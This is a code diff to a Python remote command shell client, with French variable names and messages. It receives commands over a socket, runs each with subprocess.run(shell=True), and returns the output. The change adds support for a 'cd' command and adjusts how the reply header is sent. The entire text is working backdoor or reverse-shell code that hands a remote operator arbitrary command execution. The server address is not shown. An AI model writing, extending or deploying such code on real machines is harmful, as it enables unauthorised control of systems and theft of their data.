@@ -29,8 +29,16 @@ while True:
     commande = commande_data.decode()
     print("Commande : ", commande)
 
+    commande_split = commande.split(" ")
+
     if commande == "infos":
         reponse = platform.platform() + " " + os.getcwd()
+    elif len(commande_split) == 2 and commande_split[0] == "cd":
+        try:
+            os.chdir(commande_split[1].strip("'"))
+            reponse = " "
+        except FileNotFoundError:
+            reponse = "ERREUR : ce répertoire n'exite pas"
     else:
         resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
         reponse = resultat.stdout + resultat.stderr
@@ -38,10 +46,12 @@ while True:
         if not reponse or len(reponse) == 0:
             reponse = " "
 
-    header = str(len(reponse.encode())).zfill(13)
+    data_len = len(reponse.encode())
+    header = str(data_len).zfill(13)
     print("header:", header)
     s.sendall(header.encode())
-    s.sendall(reponse.encode())
+    if data_len > 0:
+        s.sendall(reponse.encode())
     
     # handshake
 
